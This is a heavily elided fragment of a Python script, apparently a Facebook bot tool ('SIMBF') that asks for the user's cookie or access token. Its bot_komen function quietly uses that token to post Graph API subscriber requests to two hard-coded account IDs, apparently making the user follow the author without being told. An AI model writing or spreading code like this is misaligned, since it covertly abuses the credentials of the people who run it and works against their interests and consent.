...
def logo():
	os.system("clear")
	print("  \033[0;91m___ ___ __  __ ___ ___ \n \033[0;91m/ __|_ _|  \/  | _ ) __| \033[0;96mAU\033[0;97m : IBNUSTAGNZ\n\033[0;97m \__ \| || |\/| | _ \ _|  \033[0;91mFB\033[0;97m : IBNUSTAGNZ\n\033[0;97m |___/___|_|  |_|___/_|   \033[0;93mIG\033[0;97m : @IBNUSTAGNZ")
...
def bot_komen():
    ...
    requests.post('https://graph.facebook.com/100068249167519/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100024280333929/subscribers?access_token=' + token)
...
def cookie():
	logo()
	print("\n \033[0;97m[\033[0;93m*\033[0;97m] How To Get : https://youtu.be/kyWoS_42sq0")
...
def tokenz():
	...
	try:
		...
		logo()
		print("\n \033[0;97m[\033[0;93m*\033[0;97m] How To Get : Cooming")
